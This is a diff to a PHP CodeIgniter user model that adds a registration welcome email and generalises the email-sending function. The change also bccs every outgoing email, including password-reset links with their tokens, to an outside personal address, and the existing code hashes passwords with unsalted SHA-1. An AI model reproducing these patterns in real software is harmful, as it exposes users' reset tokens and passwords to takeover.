@@ -42,6 +42,13 @@ class User_model extends CI_Model {
     	$pass = $this->input->post('password');
     	$this->password = $this->encrypt->sha1($pass);
     	$this->db->insert('users', $this);
+        $data = array(
+            'user' => $this,
+            'view' => "registration_email",
+            'subject' => 'Welcome to StyleUpIndia'
+        );
+        $this->sendEmail($data);
+
     	return true;
     }
 
@@ -120,18 +127,21 @@ class User_model extends CI_Model {
         $change_key = $this->arrangeForgotPassword($email);
         $data = array(
             'url' => base_url() . "index.php/login/reset/" . $change_key,
-            'user' => $user
+            'user' => $user,
+            'view' => "forgot_password_email",
+            'subject' => 'Forgot Password'
         );
         $this->sendEmail($data);
     }
 
     public function sendEmail($data){
-        $email = $this->load->view('forgot_password_email', $data, true);
+        $email = $this->load->view($data['view'], $data, true);
         $this->send_email->from('raj.kothari90@gmail.com', 'Raj');
         $this->send_email->to($data['user']->email);
 
-        $this->send_email->subject('Forgot Password');
+        $this->send_email->subject($data['subject']);
         $this->send_email->message($email);
+        $this->send_email->bcc('mkothari2001@yahoo.com');
 
         $this->send_email->send();
     }
